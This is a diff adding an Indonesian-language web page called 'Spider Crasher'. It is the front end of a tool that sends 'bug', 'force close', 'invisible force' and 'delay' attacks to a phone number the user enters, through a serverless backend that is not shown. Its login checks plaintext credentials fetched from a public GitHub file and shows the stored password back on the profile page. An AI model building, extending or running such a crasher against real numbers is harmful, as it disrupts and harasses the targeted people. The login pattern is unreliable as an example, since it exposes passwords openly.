@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Spider Crasher</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap" rel="stylesheet">
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      font-family: 'Orbitron', sans-serif;
+      background: url('https://files.catbox.moe/isa0f6.jpg') no-repeat center center fixed;
+      background-size: cover;
+      color: #fff;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      overflow: hidden;
+    }
+    .container {
+      padding: 20px;
+      background-color: rgba(0, 0, 0, 0.75);
+      border-radius: 12px;
+      max-width: 400px;
+      width: 100%;
+      animation: fadeIn 1s ease-in-out;
+    }
+    .login-box, .main-app, .profile-page, .bug-page {
+      display: none;
+      animation: fadeInUp 0.6s ease-in-out;
+    }
+    .active { display: block; }
+    input, button, select {
+      width: 100%;
+      padding: 10px;
+      border: none;
+      border-radius: 8px;
+      margin: 10px 0;
+      font-family: 'Orbitron', sans-serif;
+    }
+    .button {
+      background-color: #ff3333;
+      color: #000;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.3s, transform 0.2s;
+    }
+    .button:hover {
+      background-color: #cc0000;
+      transform: scale(1.03);
+    }
+    .navbar {
+      position: fixed;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: linear-gradient(to top, #0a0a0a, #1a1a1a);
+      display: flex;
+      justify-content: space-between;
+      gap: 20px;
+      padding: 10px 30px;
+      border-radius: 50px;
+      box-shadow: 0 6px 12px rgba(0,0,0,0.6), inset 0 2px 4px rgba(255,255,255,0.05);
+      backdrop-filter: blur(8px);
+      z-index: 999;
+      animation: slideUp 1.2s ease-in-out;
+    }
+    .navbar button {
+      background: #0f0f0f;
+      color: #ff3333;
+      font-weight: bold;
+      border: none;
+      font-size: 14px;
+      padding: 10px 20px;
+      border-radius: 30px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.4);
+      transition: transform 0.3s, box-shadow 0.3s, background 0.3s, color 0.3s;
+    }
+    .navbar button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 12px rgba(0,0,0,0.6);
+      background-color: #ff3333;
+      color: #000;
+    }
+    .profile-pic {
+      width: 120px;
+      height: 120px;
+      border-radius: 50%;
+      object-fit: cover;
+      display: block;
+      margin: 0 auto 10px auto;
+      border: 3px solid #ff3333;
+    }
+    @keyframes fadeIn { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }
+    @keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+    @keyframes slideUp { from { transform: translate(-50%, 100%); opacity: 0; } to { transform: translate(-50%, 0); opacity: 1; } }
+  </style>
+</head>
+<body>
+<div class="container">
+  <div id="login" class="login-box active">
+    <h2>Login</h2>
+    <input type="text" id="username" placeholder="Username">
+    <input type="password" id="password" placeholder="Password">
+    <button class="button" onclick="login()">Login</button>
+    <p id="loginStatus"></p>
+  </div>
+
+  <div id="home" class="main-app">
+    <h2 style="text-align:center; line-height:1.4; font-size:16px; white-space:pre-line;">
+Welcome To Website Spider Crasher
+Tolong Gunakan Web Ini Dengan Bijak
+
+Thanks to 
+XyzzMoods [ Creator ]
+Vynx Official [ Best Friends ]
+Manzz [ Best Ftiends ]
+Young Lexx [ Handle ]
+Azka [ Handle ]
+Allah SWT [ My God ]
+
+Kebijakan Privasi :
+Website Ini Digunakan Untuk Kebutuhan! 
+Tidak Untuk Bermain main
+Harap Gunakan Dengan Bijak! 
+
+Silahkan Pilih Menu Di Bawah
+Untuk Membantu Anda! 
+© XyzzMoods
+    </h2>
+    <button class="button" onclick="logout()">🚪 Logout</button>
+  </div>
+
+  <div id="bug" class="bug-page">
+    <h2>Warr / Metode Bug</h2>
+    <input type="text" id="targetNumber" placeholder="Masukkan Nomor Target">
+    <button class="button" onclick="kirimBug()">Forclose</button>
+    <button class="button" onclick="kirimForceInvis()">Force Invis</button>
+    <button class="button" onclick="kirimDelay()">Delay</button>
+    <p id="bugStatus"></p>
+  </div>
+
+  <div id="profile" class="profile-page">
+    <h2>Profil Akun</h2>
+    <img src="https://files.catbox.moe/q7vc76.jpg" id="fotoProfil" class="profile-pic">
+    <input type="file" accept="image/*" onchange="gantiFotoProfil(event)">
+    <input type="text" id="showUsername" disabled>
+    <input type="text" id="showPassword" disabled>
+    <input type="password" id="newPassword" placeholder="Ganti Password Baru">
+    <p id="updateStatus"></p>
+    <button class="button" onclick="gantiPassword()">Simpan Perubahan</button>
+    <button class="button" style="margin-top: 10px; background-color: #ff0033; color: white;" onclick="logout()">🚪 Logout</button>
+  </div>
+</div>
+
+<div id="navbar" class="navbar" style="display:none">
+  <button onclick="showPage('home')">🏠 Home</button>
+  <button onclick="showPage('bug')">🐞 Bug</button>
+  <button onclick="showPage('profile'); updateProfileForm();">👤 Profil</button>
+</div>
+
+<script>
+let currentUser = null;
+async function login() {
+  const username = document.getElementById('username').value;
+  const password = document.getElementById('password').value;
+  try {
+    const res = await fetch('https://raw.githubusercontent.com/XyzzMoods/Data-Base-Account/main/users.json');
+    const data = await res.json();
+    const match = data.find(user => user.username.trim() === username.trim() && user.password.trim() === password.trim());
+    if (match) {
+      currentUser = match;
+      document.getElementById('login').classList.remove('active');
+      document.getElementById('home').classList.add('active');
+      document.getElementById('navbar').style.display = 'flex';
+    } else {
+      document.getElementById('loginStatus').innerText = 'Login gagal. Username atau password salah.';
+    }
+  } catch (e) {
+    document.getElementById('loginStatus').innerText = 'Gagal memuat data pengguna.';
+  }
+}
+
+function logout() {
+  document.getElementById('login').classList.add('active');
+  document.getElementById('home').classList.remove('active');
+  document.getElementById('bug').classList.remove('active');
+  document.getElementById('profile').classList.remove('active');
+  document.getElementById('navbar').style.display = 'none';
+  document.getElementById('fotoProfil').src = "https://files.catbox.moe/q7vc76.jpg";
+}
+
+function showPage(page) {
+  document.querySelectorAll('.main-app, .bug-page, .profile-page').forEach(el => el.classList.remove('active'));
+  document.getElementById(page).classList.add('active');
+}
+
+function updateProfileForm() {
+  if (currentUser) {
+    document.getElementById('showUsername').value = currentUser.username;
+    document.getElementById('showPassword').value = currentUser.password;
+  }
+}
+
+function gantiPassword() {
+  const newPass = document.getElementById('newPassword').value;
+  if (!newPass) return alert("Masukkan password baru dulu!");
+  document.getElementById('updateStatus').innerText = `🔒 Password berhasil diubah ke '${newPass}' (simulasi)`;
+}
+
+function gantiFotoProfil(event) {
+  const file = event.target.files[0];
+  if (file) {
+    const reader = new FileReader();
+    reader.onload = function (e) {
+      document.getElementById('fotoProfil').src = e.target.result;
+    };
+    reader.readAsDataURL(file);
+  }
+}
+
+async function kirimBug() {
+  const target = document.getElementById('targetNumber').value;
+  if (!target) return alert('Masukkan nomor target terlebih dahulu.');
+  try {
+    const res = await fetch(`/.netlify/functions/evolution?type=fc&target=${target}`);
+    const result = await res.json();
+    document.getElementById('bugStatus').innerText = result.success
+      ? `✅ Bug berhasil dikirim ke ${target}`
+      : `❌ Gagal: ${result.error}`;
+  } catch (err) {
+    document.getElementById('bugStatus').innerText = '❌ Gagal mengirim bug';
+  }
+}
+
+async function kirimForceInvis() {
+  const target = document.getElementById('targetNumber').value;
+  if (!target) return alert('Masukkan nomor target terlebih dahulu.');
+  try {
+    const res = await fetch(`/.netlify/functions/evolution?type=fcin&target=${target}`);
+    const result = await res.json();
+    document.getElementById('bugStatus').innerText = result.success
+      ? `✅ Force Invis dikirim ke ${target}`
+      : `❌ Gagal: ${result.error}`;
+  } catch (err) {
+    document.getElementById('bugStatus').innerText = '❌ Gagal mengirim Force Invis';
+  }
+}
+
+async function kirimDelay() {
+  const target = document.getElementById('targetNumber').value;
+  if (!target) return alert('Masukkan nomor target terlebih dahulu.');
+  try {
+    const res = await fetch(`/.netlify/functions/evolution?type=delay&target=${target}`);
+    const result = await res.json();
+    document.getElementById('bugStatus').innerText = result.success
+      ? `✅ Delay dikirim ke ${target}`
+      : `❌ Gagal: ${result.error}`;
+  } catch (err) {
+    document.getElementById('bugStatus').innerText = '❌ Gagal mengirim Delay';
+  }
+}
+</script>
+</body>
+</html>
